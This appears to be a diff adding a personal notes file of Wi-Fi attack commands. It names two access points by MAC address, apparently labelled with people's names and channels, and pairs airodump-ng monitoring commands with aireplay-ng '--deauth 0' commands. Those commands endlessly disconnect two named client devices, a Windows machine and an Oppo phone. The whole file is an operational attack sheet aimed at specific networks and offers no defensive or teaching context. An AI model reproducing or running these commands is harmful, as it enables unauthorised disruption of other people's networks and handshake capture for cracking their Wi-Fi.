@@ -1,0 +1,18 @@
+04:8D:38:39:89:95 nguyenngocanh chanel 11
+airodump-ng --bssid 04:8D:38:39:89:95 mon0
+airodump-ng --bssid 04:8D:38:39:89:95 wlan0mon
+aireplay-ng --deauth 0 -a 04:8D:38:39:89:95 -c 34:23:87:9C:0F:07 mon0 
+aireplay-ng --deauth 0 -a 04:8D:38:39:89:95 -c 34:23:87:9C:0F:07 wlan0mon
+aireplay-ng --deauth 0 -a 04:8D:38:39:89:95 -c ec:51:bc:80:94:69 mon0 
+aireplay-ng --deauth 0 -a 04:8D:38:39:89:95 -c ec:51:bc:80:94:69 wlan0mon 
+
+A8:25:EB:34:32:C3 maihuong chanel 1
+airodump-ng --bssid A8:25:EB:34:32:C3 mon0
+airodump-ng --bssid A8:25:EB:34:32:C3 wlan0mon
+aireplay-ng --deauth 0 -a A8:25:EB:34:32:C3 -c 34:23:87:9C:0F:07 mon0 
+aireplay-ng --deauth 0 -a A8:25:EB:34:32:C3 -c 34:23:87:9C:0F:07 wlan0mon
+aireplay-ng --deauth 0 -a A8:25:EB:34:32:C3 -c ec:51:bc:80:94:69 mon0 
+aireplay-ng --deauth 0 -a A8:25:EB:34:32:C3 -c ec:51:bc:80:94:69 wlan0mon
+
+34:23:87:9C:0F:07 windows quy
+ec:51:bc:80:94:69 oppo
